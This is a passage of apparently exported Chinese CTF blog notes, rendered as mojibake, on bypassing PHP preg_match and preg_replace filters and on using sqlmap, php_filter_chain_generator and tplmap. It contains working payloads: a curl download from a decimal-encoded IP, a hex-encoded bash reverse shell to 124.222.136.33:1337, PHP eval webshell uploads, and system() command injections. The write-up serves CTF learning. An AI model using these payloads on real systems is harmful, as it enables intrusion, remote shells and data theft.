    <content><![CDATA[<p>&emsp;&emsp;æ­£åˆ™åŒ¹é…ä¹Ÿæ˜¯phpä¸­æœ€å¸¸è§çš„ä¸€ç§ï¼Œä¸€èˆ¬ç”¨æ¥åšä¸€ä¸ª<del>è£…é¥°</del>åŒ¹é…ä½œç”¨ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨ä»¥ä¸‹å‡ ç§ç»•è¿‡æ–¹å¼æ¥è§„é¿æ­£åˆ™åŒ¹é…ã€‚</p>
<h3 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h3><p>&emsp;&emsp;æ­£åˆ™åŒ¹é…åé¢éƒ½ä¼šæœ‰ä¸€ä¸ªä¿®é¥°ç¬¦ï¼Œå„ä½è¦åˆ¤æ–­ç›¸åº”çš„ä¿®é¥°ç¬¦é€‰æ‹©å“ªä¸€ç§ç»•è¿‡æ–¹å¼ï¼Œåˆ«æ— è„‘å¥—ï¼Œæ¨èä¸€ä¸ªç½‘ç«™<a href="https://www.jyshare.com/front-end/854/">æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿æµ‹è¯•</a>,å®ƒæä¾›äº†ä¿®é¥°ç¬¦çš„ä»‹ç»å’Œè¯­æ³•å‚è€ƒï¼Œæ–¹ä¾¿æˆ‘ä»¬ç»§ç»­åŒ¹é…ã€‚à¼ â€“ _ â€“ à¼</p>
<h3 id="æ¢è¡Œç¬¦ç»•è¿‡ï¼ˆ-0aï¼‰"><a href="#æ¢è¡Œç¬¦ç»•è¿‡ï¼ˆ-0aï¼‰" class="headerlink" title="æ¢è¡Œç¬¦ç»•è¿‡ï¼ˆ%0aï¼‰"></a>æ¢è¡Œç¬¦ç»•è¿‡ï¼ˆ%0aï¼‰</h3><p>&emsp;&emsp;é€šå¸¸çš„ï¼Œpreg_match()å‡½æ•°åªèƒ½åŒ¹é…ä¸€è¡Œæ•°æ®ï¼Œå°¤å…¶æ˜¯é‡åˆ°è¿™ç§æƒ…å†µ<br><img data-src="/images/ciscn.png" alt="ciscn"><br>&emsp;&emsp;çœ‹ç€å¦‚æ­¤é•¿çš„è¿‡æ»¤ï¼Œä½†å› ä¸ºä¿®é¥°ç¬¦åªæœ‰ä¸€ä¸ªiï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥%0aç»•è¿‡(è¿‡æ»¤ç‚¹çš„æ–¹å¼å¯ä»¥å°†IPè½¬æˆåè¿›åˆ¶)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd=cu%0arl+http://795973494:8000/s -o /tmp/s</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ç®€å•çš„æ¥è¯´ï¼Œå½“é‡åˆ°ä¿®é¥°ç¬¦åªæœ‰içš„æ—¶å€™ï¼Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0aç§’äº†ã€‚</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^flag$/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>])</span></span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å› æ­¤æˆ‘ä»¬ä¼ å…¥?a&#x3D;flag%0aå³å¯ç»•è¿‡</p>
<h3 id="åˆ©ç”¨æ•°ç»„ç»•è¿‡"><a href="#åˆ©ç”¨æ•°ç»„ç»•è¿‡" class="headerlink" title="åˆ©ç”¨æ•°ç»„ç»•è¿‡"></a>åˆ©ç”¨æ•°ç»„ç»•è¿‡</h3><p>&emsp;&emsp;åŒmd5()å‡½æ•°åŸç†ï¼Œå½“å‚æ•°æ˜¯æ•°ç»„ç±»å‹çš„æ—¶å€™ï¼Œä¼šä»¥æŠ¥é”™çš„å½¢å¼æ¥ç»•è¿‡åˆ¤æ–­ã€‚ä½†å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ•´ä¸ªifæ¡ä»¶ä¸æ‰§è¡Œï¼Œå¦‚æœé‡Œé¢æ˜¯è¾“å‡ºflagå½¢å¼çš„ï¼Œæ­¤æ–¹æ³•æ— ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$a</span>)==<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¿™ç§æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡ï¼Œè®©ifæ¡ä»¶æŠ¥é”™ã€‚ä¸ä»…ä»…é’ˆå¯¹preg_matchï¼Œæ•°ç»„ç»•è¿‡é’ˆå¯¹å¤§å¤šåŒ¹é…çš„å‡½æ•°éƒ½æœ‰æ•ˆï¼Œä¾‹å¦‚strcmpã€‚</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?a</span>[]=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="PCREå›æº¯é™åˆ¶ç»•è¿‡"><a href="#PCREå›æº¯é™åˆ¶ç»•è¿‡" class="headerlink" title="PCREå›æº¯é™åˆ¶ç»•è¿‡"></a>PCREå›æº¯é™åˆ¶ç»•è¿‡</h3><p>&emsp;&emsp;å¦‚ä½•ç»•è¿‡å‘¢ï¼Œè®©å›æº¯æ¬¡æ•°è¶…è¿‡æœ€å¤§é™åˆ¶å°±å¯ä»¥ä½¿preg_match()å‡½æ•°è¿”å›falseï¼Œä»è€Œç»•è¿‡é™åˆ¶ï¼Œä¸­æ–‡çš„å›æº¯æ¬¡æ•°åœ¨100ä¸‡æ¬¡å°±å¥½å´©æºƒï¼Œè¿™ä¸ªå›æº¯ä¿æŠ¤ä½¿PHPä¸ºäº†é˜²æ­¢å…³äºæ­£åˆ™è¡¨è¾¾å¼çš„DDOS<br>payload:<br>GET:</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">requests</span></span><br><span class="line"><span class="variable">from</span> <span class="variable">io</span> <span class="variable">import</span> <span class="variable">BytesIO</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> =<span class="function"><span class="title">BytesIO</span>(<span class="variable">b</span><span class="string">&#x27;[]&#x27;</span>+<span class="variable">b</span><span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span></span><br><span class="line"><span class="variable">res</span> = <span class="variable">requests.get</span>(<span class="string">&#x27;[]?[]=&#x27;</span>+<span class="function"><span class="title">str</span>(<span class="variable">payload</span>))</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">res.text</span>)</span></span><br></pre></td></tr></table></figure>
<p>POST:  </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(b<span class="string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="string">&#x27;a&#x27;</span> * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;[]&#x27;</span>, <span class="attribute">files</span>=files, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;[]å³ä»£è¡¨æ ¹æ®é¢˜ç›®æ¥å¡«å……</p>
<h3 id="å–åç»•è¿‡"><a href="#å–åç»•è¿‡" class="headerlink" title="å–åç»•è¿‡"></a>å–åç»•è¿‡</h3><p>&emsp;&emsp;å°±æ˜¯é€šè¿‡URLç¼–ç è¿›è¡Œå–åç»•è¿‡ï¼Œå½“ç„¶å…¶ä»–ç¼–ç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿›åˆ¶å°±æ›´ä¸ç”¨è¯´äº†ï¼ˆé€šå¸¸ä½¿ç”¨åå…­è¿›åˆ¶ï¼‰ï¼Œè¿™é‡Œç•¥å¾®ä¸¾ä¸ªä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;phpinfo&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>å–åå¾—åˆ°%8F%97%8F%96%91%99%90ï¼ˆå–åä½¿ç”¨çš„ä½¿ä¸å¯è§å­—ç¬¦ï¼Œé‡åˆ°&#x2F;sè¿˜æ˜¯å¾—å¯„ï¼‰</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code=$_=~(%8F%97%8F%96%91%99%90);$_();</span><br></pre></td></tr></table></figure>


<h3 id="5cç»•è¿‡"><a href="#5cç»•è¿‡" class="headerlink" title="%5cç»•è¿‡"></a>%5cç»•è¿‡</h3><p>&emsp;&emsp;è¿™ä¸ªä¸å¸¸è§ï¼Œ%5cå…¶å®å°±æ˜¯â€\â€œ,äº†è§£ä¸€ä¸‹å°±å¯ä»¥äº†</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/i</span>ä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line"><span class="string">/s</span>åŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ï¼Œç­‰ä»·äº[fnrtv]</span><br><span class="line"></span><br><span class="line"><span class="string">/D</span>å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¿™é‡Œå­˜åœ¨&#x2F;så’Œ&#x2F;Då› æ­¤å®ƒä¼šåŒ¹é…åˆ°æ¢è¡Œï¼Œ%0aå› æ­¤å°±æ— æ³•ç»•è¿‡ã€‚è¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨%5c</p>
<h3 id="å•å¼•å·ç»•è¿‡"><a href="#å•å¼•å·ç»•è¿‡" class="headerlink" title="å•å¼•å·ç»•è¿‡"></a>å•å¼•å·ç»•è¿‡</h3><p>&emsp;&emsp;è¿™ä¸ªä¹Ÿä¸å¸¸ç”¨ï¼Œåœ¨æ¯ä¸€ä¸ªå­—ç¬¦å‰åŠ ä¸Šå•å¼•å·å¯ä»¥ç»•è¿‡preg_matchçš„åŒ¹é…ã€‚<br><img data-src="/images/%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87.png" alt="å•å¼•å·ç»•è¿‡"></p>
<h3 id="è¿›åˆ¶ç»•è¿‡"><a href="#è¿›åˆ¶ç»•è¿‡" class="headerlink" title="è¿›åˆ¶ç»•è¿‡"></a>è¿›åˆ¶ç»•è¿‡</h3><p>&emsp;&emsp;é€šè¿‡è¿›åˆ¶ç»•è¿‡æ˜¯é€šç”¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŒ‡ä»¤è½¬æˆåå…­è¿›åˆ¶ï¼Œç„¶åç”¨php -rè¿›è¡Œphpä»£ç æ‰§è¡Œã€‚<br><img data-src="/images/ciscn.png" alt="ciscn"><br>&emsp;&emsp;payload</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">cmd</span>=php -r <span class="variable">$a</span>=substr(Z62617368202d63202262617368202d69203e26202f6465762f7463702f3132342e3232322e3133362e33332f3133333720303e263122,<span class="number">1</span>)<span class="comment">;system(hex2bin($a));</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¿™æ®µåå…­è¿›åˆ¶æ˜¯å‘½ä»¤<font color=blue>bash -c â€œbash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.136.33&#x2F;1337 0&gt;&amp;1â€</font>è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯å‘124.222.136.33(æœåŠ¡å™¨çš„IP)çš„1337ç«¯å£å»ºç«‹ä¸€ä¸ªè¿æ¥ï¼Œè¾“å…¥(0)çš„å†…å®¹å˜ä¸ºå‘½ä»¤è¾“å‡º(1)ã€‚ä¹‹æ‰€ä»¥å‰é¢æœ‰zä¸å±äº16è¿›åˆ¶çš„å­—ç¬¦å­˜åœ¨æ—¶å› ä¸ºåŠ ä¸äº†å¼•å·ï¼Œå¼€å¤´æ˜¯æ•°å­—çš„è¯ï¼Œå°±ä¼šå°†ç±»å‹è¯†åˆ«ä¸ºæ•°å­—ï¼Œè‹¥åç»­å‡ºç°äº†å­—ç¬¦ä¸²å°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨substrå°†ç±»å‹è½¬ä¸ºå­—ç¬¦ä¸²ã€‚</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‡½æ•°ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>preg_replace</title>
    <url>/2024/07/12/preg-replace/</url>
    <content><![CDATA[<p>&emsp;&emsp;preg_replace å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ã€‚ç›¸æ¯”äºpreg_match å‡½æ•°å®ƒå¤šäº†ä¸€ä¸ªæ›¿æ¢çš„åŠŸèƒ½ï¼ˆæ²¡é”™ï¼Œè¯´äº†ä¸€å¥åºŸè¯ï¼‰<br>&emsp;&emsp;é€šå¸¸æ¥è¯´ï¼Œå®ƒæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œpreg_repalce($pattern,$repalcement,$subject);â€“&gt;æœç´¢$subjectä¸­åŒ¹é…$patternçš„éƒ¨åˆ†ï¼Œå¹¶ä»¥$replacementè¿›è¡Œæ›¿æ¢ã€‚è¯ä¸å¤šè¯´ï¼Œçœ‹é¢˜ç›®å°±æ‡‚äº†ã€‚<br>æ³¨ï¼šstr_replaceä¹Ÿæ˜¯ä¸€æ ·çš„ç‰¹æ€§ï¼ŒåŒºåˆ«æ˜¯æ­£åˆ™çš„è§„åˆ™åŒ¹é…</p>
<h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;èœï¼Œå°±å¤šç»ƒ&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;æ—¢ç„¶HYNUCTFç»„åˆä¼šå˜ä¸ºç©ºé‚£ä¹ˆå¯ä»¥é€šè¿‡åŒå†™æ‹¼æ¥è¿›è¡Œç»•è¿‡ï¼ŒåŸç†è·Ÿsqlæ³¨å…¥çš„å…³é”®å­—ç»•è¿‡å·®ä¸å¤šã€‚<br>payloadï¼šHYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;çº¢è‰²éƒ¨åˆ†è¢«æ›¿æ¢æˆäº†ç©ºï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å°±æ‹¼æ¥æˆäº†æ˜¯å§ã€‚</p>
<h3 id="evalåˆ›å»ºæ–°å˜é‡ç»•è¿‡"><a href="#evalåˆ›å»ºæ–°å˜é‡ç»•è¿‡" class="headerlink" title="evalåˆ›å»ºæ–°å˜é‡ç»•è¿‡"></a>evalåˆ›å»ºæ–°å˜é‡ç»•è¿‡</h3><p>&emsp;&emsp;è¿™æ˜¯ä¸ªå¾ˆæœ‰ç”¨çš„åœ°æ–¹ï¼Œå¾ˆå¤šé¢˜å‹éƒ½é€‚ç”¨è¿™ä¸ªï¼Œå½“é‡åˆ°è¿‡æ»¤äº†å…³é”®å­—ç¬¦æˆ–è€…æ²¡æœ‰å¤´ç»ªçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œåˆ›å»ºä¸€ä¸ªæ–°å˜é‡å»æ‰§è¡Œå®ƒã€‚<br>&emsp;&emsp;ä¾‹å¦‚</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br><span class="line">payloadï¼š  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¿™æ˜¯åˆ©ç”¨evalæ‰§è¡Œsystemå‘½ä»¤å»å¯»æ‰¾æ‹¥æœ‰flagçš„é¡µé¢ï¼Œåç»­åŒç†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨GETå’ŒPOSTæ–¹æ³•æ¥è¿›è¡Œç»•è¿‡ã€‚</p>
<h3 id="ç»å…¸æ¼æ´-e"><a href="#ç»å…¸æ¼æ´-e" class="headerlink" title="ç»å…¸æ¼æ´&#x2F;e"></a>ç»å…¸æ¼æ´&#x2F;e</h3><p>&emsp;&emsp;preg_replaceå‡½æ•°çš„ç‰¹æ€§ï¼Œ&#x2F;eå¯æ‰§è¡Œæ¨¡å¼ï¼Œæ­¤ä¸ºPHPä¸“æœ‰å‚æ•°ï¼Œä¾‹å¦‚preg_replaceå‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒçš„$repalcementéƒ¨åˆ†ä¼šè¢«å½“åšå‘½ä»¤æ‰§è¡Œã€‚  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;æ­¤æ—¶ä¼ å…¥?str&#x3D;system(â€œlsâ€);å°±å¯æ‰§è¡Œæ­¤ä»£ç ã€‚</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‡½æ•°ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>print&amp;print_r</title>
    <url>/2024/07/13/print-print-r/</url>
    <content><![CDATA[<p>&emsp;&emsp;print()åªèƒ½æ‰“å°å‡ºç®€å•ç±»å‹å˜é‡çš„å€¼ï¼ˆå¦‚int,stringï¼‰ï¼Œè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<br>&emsp;&emsp;print_r()å¯ä»¥æ‰“å°å‡ºå¤æ‚ç±»å‹å˜é‡çš„å€¼ï¼ˆå¦‚æ•°ç»„ï¼Œå¯¹è±¡ï¼‰ï¼Œæ‰“å°å…³äºå˜é‡çš„æ˜“äºç†è§£çš„ä¿¡æ¯ã€‚é€šå¸¸æ‰“æ¯”èµ›çš„æ—¶å€™ç»å¸¸ä½¿ç”¨çš„æ˜¯å®ƒã€‚<br>&emsp;&emsp;å»ºè®®å®è·µï¼Œæ–¹ä¾¿ç†è§£ã€‚</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>åŒºåˆ«</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2024/08/03/sqlmap/</url>
    <content><![CDATA[<p>&emsp;&emsp;sqlmapæ˜¯kaliè‡ªå¸¦çš„ä¸€ç§å·¥å…·ï¼Œé€šå¸¸å¯¹ç½‘ç«™è¿›è¡Œsqlæ³¨å…¥ï¼Œé¦–å…ˆå°±è¦åšçš„æ˜¯æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œæ‰¾åˆ°åå°±å¯ä»¥ä½¿ç”¨sqlmapä¸€æŠŠæ¢­äº†ã€‚åŒæ—¶å®ƒä¹Ÿå…·å¤‡äº†ä¸€äº›è„šæœ¬å»ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥æ­é…è‡ªå®šä¹‰è„šæœ¬ï¼Œç†è®ºä¸Šsqlé¢˜ç›®å¯ä»¥é€šæ€çš„ï¼Œçœ‹ä½ çš„æŒæ¡åº¦å¦‚ä½•ã€‚å¸¸è§„æŒ‡ä»¤æœ‰å¦‚ä¸‹ï¼Œå®ç”¨æŒ‡æ•°:â­â­â­â­<br><img data-src="/images/sqlmap.png" alt="sqlmap"><br>&emsp;&emsp;ç»å…¸ä¸€æŠŠæ¢­</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> <span class="built_in">-batch</span>(çˆ†åº“)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch -D <span class="string">&#x27;    &#x27;</span>(çˆ†è¡¨)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>(çˆ†åˆ—)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>  <span class="attr">--dump</span>(çˆ†æ®µ)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>php_filter_chain_generator</title>
    <url>/2024/07/14/php-filter-chain-generator/</url>
    <content><![CDATA[<p>&emsp;&emsp;æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æµåœ¨å…¶ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå®ç”¨æŒ‡æ•°:â­â­â­è„šæœ¬ä¸‹è½½<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;å¸¸ç”¨çš„å‘½ä»¤ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥çœ‹é‚£é‡Œçš„ï¼‰  </p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;ä¸€å¥è¯æœ¨é©¬&#x27;</span></span><br></pre></td></tr></table></figure>
<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;å°†å›æ˜¾çš„é“¾å­å¤åˆ¶ç»™ç½‘é¡µ,ç„¶åç”¨hackbaræˆ–è€…èšå‰‘è¿æ¥å³å¯ã€‚<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>tplmap</title>
    <url>/2024/06/06/tplmap/</url>
    <content><![CDATA[<h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmapä»‹ç»"><a href="#tplmapä»‹ç»" class="headerlink" title="tplmapä»‹ç»"></a>tplmapä»‹ç»</h3><p>&emsp;&emsp;Tplmapæ˜¯ä¸€ä¸ªpythonå·¥å…·ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨æ²™ç®±è½¬ä¹‰æŠ€æœ¯æ‰¾åˆ°ä»£ç æ³¨å…¥å’ŒæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ã€‚è¯¥å·¥å…·èƒ½å¤Ÿåœ¨è®¸å¤šæ¨¡æ¿å¼•æ“ä¸­åˆ©ç”¨SSTIæ¥è®¿é—®ç›®æ ‡æ–‡ä»¶æˆ–æ“ä½œç³»ç»Ÿã€‚ä¸€äº›å—æ”¯æŒçš„æ¨¡æ¿å¼•æ“åŒ…æ‹¬PHPï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒRubyï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒJaveScriptï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒPythonï¼ˆä»£ç è¯„ä¼°ï¼‰ï¼ŒERBï¼ŒJinja2å’ŒTornadoã€‚è¯¥å·¥å…·å¯ä»¥æ‰§è¡Œå¯¹è¿™äº›æ¨¡æ¿å¼•æ“çš„ç›²æ³¨å…¥ï¼Œå¹¶å…·æœ‰æ‰§è¡Œè¿œç¨‹å‘½ä»¤çš„èƒ½åŠ›ã€‚ï¼ˆè¯´çš„é«˜çº§å§ï¼Œå…¶å®é€‰ç”¨å…¶ä»–åšä¸»çš„(â—â€™â—¡â€™â—)ï¼‰å®ç”¨æŒ‡æ•°â­â­â­</p>
<h3 id="å®‰è£…æ–¹æ³•"><a href="#å®‰è£…æ–¹æ³•" class="headerlink" title="å®‰è£…æ–¹æ³•"></a>å®‰è£…æ–¹æ³•</h3><p>&emsp;&emsp;åœ¨kaliæˆ–è€…linuxå®‰è£…å³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;è¿›å…¥è¯¥æ–‡ä»¶å¤¹ä¸‹å®‰è£…ä¾èµ–ï¼ˆå°±æ˜¯å®‰è£…åº“å•¦ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tplmap</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å¦‚æœå®‰è£…æŠ¥é”™äº†ï¼Œä¸å¦¨è¯•ä¸€è¯•pip2å®‰è£…ï¼Œåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„ï¼Œæˆ‘å°±æ˜¯(á‡‚_á‡‚|||)</p>
<h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt;?name=</span><br><span class="line">POST:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt; --data= name=</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/tplmap.png" alt="tplmap"></p>
<p>&emsp;&emsp;å¦‚ä¸Šé¢æ‰€ç¤ºï¼Œå¯ä»¥å¾—å‡ºæ¨¡æ¿æ˜¯jinja2ï¼Œå¦‚æœä¸‹é¢é‚£ä¸€æ®µæ˜¾ç¤ºyesæˆ–è€…okï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ç”¨shellæŒ‡ä»¤ï¼ˆâ€“os-shellï¼‰ã€‚</p>
<p>&emsp;&emsp;æ›´å¤šç”¨æ³•å¯ä»¥ç”¨helpæŸ¥çœ‹ï¼Œå¾ˆå¤špythonè„šæœ¬éƒ½å¯ä»¥è¿™æ ·åš(ä¸è®¤è¯†è‹±æ–‡ç›´æ¥å»æ‰¾ç¿»è¯‘(à¸‡ â€¢Ì€_â€¢Ì)à¸‡åŠ æ²¹)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 tplmap.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
      </tags>
